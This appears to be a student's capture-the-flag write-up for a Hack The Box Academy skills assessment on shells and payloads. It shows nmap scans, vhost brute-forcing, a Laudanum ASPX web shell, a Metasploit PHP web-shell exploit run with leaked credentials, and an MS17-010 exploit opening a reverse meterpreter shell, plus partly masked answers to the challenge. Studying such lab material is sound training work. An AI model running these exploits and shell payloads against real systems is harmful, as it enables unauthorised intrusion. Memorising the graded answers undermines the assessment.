# [Shells and Payloads](https://academy.hackthebox.com/module/details/115)

## Skills Assessment - Shells and Payloads

> Here we are. It’s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.

> CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

![Network diagram with three hosts: Host-01 at 172.16.1.11:8080, Host-02 at blog.inlanefreight.local, Host-03 at 172.16.1.13, and a foothold labeled 'See target spawn'.](https://academy.hackthebox.com/storage/modules/115/challenge-map.png)

> Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal Inlanefreight network (`172.16.0.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.

Questions:
1. What is the hostname of `Host-1`? (Format: all lower case). `shell********`
2. Exploit the target and gain a shell session. Submit the name of the folder located in `C:\Shares\` (Format: all lower case). `dev-s****`
3. What distribution of Linux is running on `Host-2`? (Format: distro name, all lower case). `Ubuntu`
4. What language is the shell written in that gets uploaded when using the `50064.rb` exploit? `php`
5. Exploit the blog site and establish a shell session with the target OS. Submit the contents of `/customscripts/flag.txt`. `B1nD_*************`
6. What is the hostname of `Host-3`? `SHELL*********`
7. Exploit and gain a shell session with `Host-3`. Then submit the contents of `C:\Users\Administrator\Desktop\Skills-flag.txt`. `One-H*********`

### Host-1

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ ifconfig ens224

[SNIP]

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.1.5  netmask 255.255.254.0  broadcast 172.16.1.255
```

```
┌──(nabla㉿kali)-[~]
└─$ fping -a -g 172.16.0.0/23 2> /dev/null

172.16.1.5
172.16.1.11
172.16.1.12
172.16.1.13
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 172.16.1.11 -T5

[SNIP]

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
515/tcp   open  printer
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
3387/tcp  open  backroomnet
3389/tcp  open  ms-wbt-server
5504/tcp  open  fcp-cics-gw1
5985/tcp  open  wsman
8080/tcp  open  http-proxy

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sSV -p445 --script=smb-os-discovery 172.16.1.11 -T5

[SNIP]

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
MAC Address: 00:50:56:94:6F:8A (VMware)
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shell******** 📌
|   NetBIOS computer name: SHELL********\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-17T10:43:17-07:00
```

```
┌──(nabla㉿kali)-[~]
└─$ cat /etc/hosts

[SNIP]

172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local
```

![Firefox - Homepage (`status.inlanefreight.local`) 01](./assets/screenshots/shells_and_payload_skills_assessment_01.png)

![Firefox - Homepage (`status.inlanefreight.local`) 02](./assets/screenshots/shells_and_payload_skills_assessment_02.png)

### Web Shells - ASP/ASPX

```
┌──(nabla㉿kali)-[~]
└─$ whatweb http://status.inlanefreight.local

http://status.inlanefreight.local [200 OK] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[172.16.1.11], Microsoft-IIS[10.0], Title[Inlanefreight Server Status][Title element contains newline(s)!], X-Powered-By[ASP.NET]
```

```
┌──(nabla㉿kali)-[~]
└─$ cp /usr/share/laudanum/aspx/shell.aspx ./shell.aspx
```

![Firefox - Uploaded Shell Page (`status.inlanefreight.local`) 02](./assets/screenshots/shells_and_payload_skills_assessment_03.png)

---

### Host-2

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 172.16.1.12 -T5

[SNIP]

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sSVC -p22,80 172.16.1.12 -T5

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 📌
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Inlanefreight Gabber
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

```
┌──(nabla㉿kali)-[~]
└─$ curl http://172.16.1.12

<!DOCTYPE html>
<html>
    <head>
        <title>Testing Default Vhosts</title>
    </head>
    <body>
        <p>This is the inlanefreight.local default vhost</p>
    </body>
</html>
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '172.16.1.12\tinlanefreight.local' | sudo tee -a /etc/hosts

172.16.1.12	inlanefreight.local
```

```
┌──(nabla㉿kali)-[~]
└─$ gobuster vhost -u inlanefreight.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

[SNIP]

Found: dev.inlanefreight.local (Status: 200) [Size: 565]
Found: admin.inlanefreight.local (Status: 200) [Size: 567]
Found: app.inlanefreight.local (Status: 200) [Size: 565]  
Found: blog.inlanefreight.local (Status: 200) [Size: 10103]
Found: drupal.inlanefreight.local (Status: 200) [Size: 10855]
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '172.16.1.12\tdev.inlanefreight.local admin.inlanefreight.local app.inlanefreight.local blog.inlanefreight.local drupal.inlanefreight.local' | sudo tee -a /etc/hosts

172.16.1.12	dev.inlanefreight.local admin.inlanefreight.local app.inlanefreight.local blog.inlanefreight.local drupal.inlanefreight.local
```

![Firefox - Homepage (`blog.inlanefreight.local`)](./assets/screenshots/shells_and_payload_skills_assessment_04.png)

![Firefox - Login Page (`blog.inlanefreight.local`)](./assets/screenshots/shells_and_payload_skills_assessment_05.png)

```
┌──(nabla㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://blog.inlanefreight.local

[SNIP]

/data                 (Status: 301) [Size: 335] [--> http://blog.inlanefreight.local/data/]
/static               (Status: 301) [Size: 337] [--> http://blog.inlanefreight.local/static/]
Progress: 830 / 220561 (0.38%)                                                  /app                  (Status: 301) [Size: 334] [--> http://blog.inlanefreight.local/app/]  
```

![Firefox - `/data` Page (`blog.inlanefreight.local`)](./assets/screenshots/shells_and_payload_skills_assessment_06.png)

![Firefox - `config.ini` Page (`blog.inlanefreight.local`)](./assets/screenshots/shells_and_payload_skills_assessment_07.png)

```yaml
credentials:
    username: admin
    password: 'admin123!@#'
    host: blog.inlanefreight.local
```

![Firefox - Vulnerability Hint (`blog.inlanefreight.local`)](./assets/screenshots/shells_and_payload_skills_assessment_08.png)

### Web Shells - PHP

```
┌──(nabla㉿kali)-[~]
└─$ searchsploit lightweight facebook-styled blog --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'

{
  "Title": "Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)",
  "Codes": "",
  "Path": "/usr/share/exploitdb/exploits/php/webapps/50064.rb"
}
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo cp /usr/share/exploitdb/exploits/php/webapps/50064.rb /usr/share/metasploit-framework/modules/exploits/
```

```
┌──(nabla㉿kali)-[~]
└─$ msfconsole -q -x "use exploit/50064.rb; set PAYLOAD php/meterpreter/bind_tcp; set RHOSTS 172.16.1.12; set VHOST blog.inlanefreight.local; set RPORT 80; set USERNAME admin; set PASSWORD admin123!@#; set LPORT 1337; exploit"

[SNIP]

[*] Got CSRF token: 626fbb6405
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/4xce.php 📌
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:1337
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:1337) at 2025-07-16 13:36:51 -0400

[SNIP]

cat /customscripts/flag.txt
B1nD_************* 📌
```

---

### Host-3

#### External Information Gathering

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 172.16.1.13 -T5

[SNIP]

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sSV -p445 --script=smb-os-discovery 172.16.1.13 -T5

[SNIP]

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
MAC Address: 00:50:56:94:84:78 (VMware)
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELL********* 📌
|   NetBIOS computer name: SHELL*********\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-16T10:40:36-07:00
```

```
┌──(nabla㉿kali)-[~]
└─$ msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 172.16.1.13; run"

[+] 172.16.1.13:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
```

#### Staged MSFconsole Payloads

```
┌──(nabla㉿kali)-[~]
└─$ msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set PAYLOAD windows/meterpreter/reverse_tcp; set RHOSTS 172.16.1.13; set LHOST ens224; set LPORT 7331; exploit"

[SNIP]

[*] Started reverse TCP handler on 172.16.1.5:7331 
[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
[*] 172.16.1.13:445 - Built a write-what-where primitive...
[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
[*] 172.16.1.13:445 - Selecting PowerShell target
[*] 172.16.1.13:445 - Executing the payload...
[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 172.16.1.13
[*] Meterpreter session 1 opened (172.16.1.5:7331 -> 172.16.1.13:49672) at 2025-07-16 13:48:04 -0400

[SNIP]

C:\Windows\system32>type C:\Users\Administrator\Desktop\Skills-flag.txt
One-H********* 📌
```

---
---
